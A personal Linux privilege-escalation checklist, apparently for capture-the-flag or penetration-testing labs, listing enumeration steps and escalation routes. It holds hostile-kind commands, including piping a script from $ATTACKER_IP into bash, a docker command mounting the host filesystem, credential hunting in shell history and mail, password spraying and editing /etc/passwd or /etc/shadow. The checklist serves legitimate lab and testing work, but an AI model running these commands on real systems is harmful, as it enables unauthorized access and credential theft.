---
note_tags:
  - linux
  - recon
  - checklist
  - privesc
  - linpeas
  - foothold
  - privilege-escalation
  - suid
---
# Linux Shell Enumeration Checklist

**Author:** Julien Bongars\
**Date:** 2026-02-09
**Path:**

---

## Foothold

- [ ] We have the password for the current user
  - [ ] `sudo -n -l` -- -n means non interactive
    - [ ] GTFO bins to escalate to that user
    - [ ] There is a custom script/tool? → See **Jail Breakout**
  - [ ] User sudoed in the past `find /home -name .sudo_as_admin_successful`
- [ ] Is current user part of any special groups? `id`
- [ ] Anyone currently logged on? `lastlog`
- [ ] `grep -i password ~/.bash_history`
- [ ] `env` — credentials or paths leaking?
- [ ] `cat /etc/hosts` — any vhosts missed?
- [ ] Download `/var/www/html`
  - [ ] Git repo?
    - [ ] `git diff --cached HEAD`
    - [ ] `git rebase -i --root`
- [ ] Any processes owned by user/root?
  - [ ] Is process tree visible to current user?
  - [ ] NGINX running?
- [ ] Any SSH ports open?
  - [ ] Any passwords discovered?
    - [ ] `nxc ssh` password spray accounts in `/etc/passwd`
- [ ] Any database connections?
  - [ ] `mysql -u admin...` then scrape for users
    - [ ] Admin dashboards now accessible?
    - [ ] Hash crackable? Fast hash and/or no salt
    - [ ] Any way to change/reset password for user
- [ ] Any private keys left on server? Ability to forge `jwt` tokens to impersonate other users?
- [ ] Ports open on localhost `ss -tunlp`
  - [ ] Any open sockets?
- [ ] Any backups/config in:
  - Common
    - /proc/self/cwd~
    - /var/www/html
    - /etc
    - /var/backups
    - /opt
  - Don't waste too much time here
    - /usr/share
    - /var
    - /usr
    - /
- [ ] SUID binaries `find / -perm -4000 -type f 2>/dev/null`
- [ ] Capabilities `getcap -r / 2>/dev/null`
- [ ] Writable files `find / -writable -type f 2>/dev/null`
- [ ] Readable sensitive files `find / -readable 2>/dev/null`
- [ ] Cron jobs `cat /etc/crontab; ls -la /etc/cron*; systemctl list-timers`
  - [ ] Wildcard injection? (`tar *`, `rsync *`, `chown *` in writable dir)
- [ ] NFS shares `cat /etc/exports` — look for `no_root_squash`
- [ ] Mail `cat /var/mail/* /var/spool/mail/*`
- [ ] Kernel version `uname -a` — kernel exploits as last resort
- [ ] Is this a docker container?
  - [ ] /.dockerenv exists? `cat /proc/1/cgroup | grep docker`
  - [ ] Docker socket writable? `ls -la /var/run/docker.sock`
  - [ ] Mount host filesystem: `docker run -v /:/host -it ubuntu chroot /host`
  - [ ] Running as root inside container? → breakout via `--privileged`
  - [ ] `capsh --print` — dangerous caps like `CAP_SYS_ADMIN`?
- [ ] Run LinEnum `curl http://$ATTACKER_IP:80/linenum.sh | bash`

## Root Access

- [ ] Do we actually need root to get flag? /root/root.txt
- [ ] sudo -l again as new user
- [ ] Any cron/backup scripts running as root? → See Jail Breakout
- [ ] Writable /etc/passwd? → add root user
- [ ] Writable /etc/shadow? → replace root hash
- [ ] Writable /etc/sudoers? → give yourself sudo
- [ ] Custom SUID binary not on GTFOBins? → strings, ltrace, strace
- [ ] Unual SUID bit set for binary?
  - [ ] `cp` will copy ownership
- [ ] Kernel exploit as last resort uname -a → searchsploit

## Jail Breakout

- [ ] Missing full path in sudo/cron entry? → PATH poisoning
- [ ] Native debug/shell command? (GTFO bins)
- [ ] Source code visible?
  - [ ] Race condition? TOCTOU
  - [ ] Relative path calling other binaries?
- [ ] Opportunity to poison lib file/dependency?
  - [ ] `ldd` on binary — writable library path? `LD_LIBRARY_PATH` preserved?
- [ ] Known vulnerabilities on searchsploit?
- [ ] Does the script take any files as input?
- [ ] Does the script arbitrarily execute code?
  - [ ] Possible to inject file/remote file?
- [ ] Is there a raw binary?
  - [ ] Can it be run locally?
  - [ ] Dynamic testing
  - [ ] Static analysis using ghidra

## Resources

- [GTFOBins](https://gtfobins.github.io/) — sudo / SUID escapes referenced as GTFO bins
- [LinEnum](https://github.com/rebootuser/LinEnum) — the `linenum.sh` the foothold checklist curls
